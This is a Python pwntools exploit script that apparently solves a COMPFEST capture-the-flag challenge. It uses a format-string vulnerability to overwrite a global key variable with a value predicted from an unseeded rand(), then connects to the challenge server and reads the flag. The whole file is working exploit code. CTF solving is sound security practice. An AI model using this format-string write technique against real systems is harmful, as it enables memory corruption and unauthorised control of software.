#!/usr/bin/env python3
from pwn import *
import re

# This script exploits a format string vulnerability in the provided challenge.
# The goal is to make the condition in the `while` loop of the `main` function false.
# The loop condition is `v6 != key || !key`.
# To exit the loop, we need `v6 == key` AND `key != 0`.

# --- Configuration ---
# The remote server details
HOST = 'ctf.compfest.id'
PORT = 7001

# The address of the global variable 'key' found from the static analysis of the binary.
# IDA Pro guessed its location at 0x4040B0. We assume PIE is disabled.
KEY_ADDR = 0x4040B0

# The number of characters printed by the program before our format string.
# "Your voice echoed: " has a length of 19.
NUMB_WRITTEN = 19

# --- Value Calculation ---
# The program calculates a 64-bit value 'v6' in main:
# v6 = ((__int64)rand() << 32) | 0xDEADBEEFLL;
# This `rand()` call happens *before* `srand(time(0))` is called in `setup()`.
# When `srand` hasn't been called, it's implicitly seeded with 1.
# We can replicate this behavior to find the exact value of `v6`.

# We can find the first value of rand() with seed 1 using a simple C program:
# #include <stdio.h>
# #include <stdlib.h>
# int main() { srand(1); printf("%d\n", rand()); }
# This gives 1804289383, which is 0x6B8B4567 in hexadecimal.
RAND_V6_VAL = 0x6B8B4567

# Now, construct the full 64-bit value of v6
V6_VAL = (RAND_V6_VAL << 32) | 0xDEADBEEF

# --- Exploit ---
# Set the context for pwntools to amd64
context.arch = 'amd64'

# The format string offset. Based on the provided leak, the 6th argument
# on the stack points to our input buffer.
OFFSET = 6

# Use the built-in `fmtstr_payload` from pwntools. It is highly optimized
# and should generate a payload that is short enough for the buffer.
# We tell it which offset to use and what value to write to which address.
payload = fmtstr_payload(OFFSET, {KEY_ADDR: V6_VAL}, numbwritten=NUMB_WRITTEN, write_size='short')


# --- Execution ---
log.info("Starting exploit...")
log.info(f"Calculated v6 value: {hex(V6_VAL)}")
log.info(f"Target address (key): {hex(KEY_ADDR)}")
log.info(f"Using format string offset: {OFFSET}")
log.info(f"Payload length: {len(payload)}")

# Ensure the payload is not too long for the buffer (fgets reads n-1 chars)
if len(payload) >= 80:
    log.error("Generated payload is too long for the buffer. The exploit will fail.")
    exit(1)

log.info("Connecting to the remote server...")
p = None # Initialize p to None
try:
    # Connect to the remote service
    p = remote(HOST, PORT)

    # The program prompts "Say something: ". We send our payload.
    p.sendlineafter(b'Say something: ', payload)
    log.info("Payload sent.")

    # After a successful write, the program should print the congratulatory
    # message and the flag. We can now listen for that specific output.
    log.info("Waiting for flag...")
    p.recvuntil(b"Congratulations, you made it.\nHere's your flag: ")
    flag = p.recvline().strip().decode()
    log.success(f"Flag: {flag}")


except Exception as e:
    log.error(f"An error occurred: {e}")
    log.info("Exploit failed. Check the offset and server status.")

finally:
    # Cleanly close the connection
    if p:
        p.close()
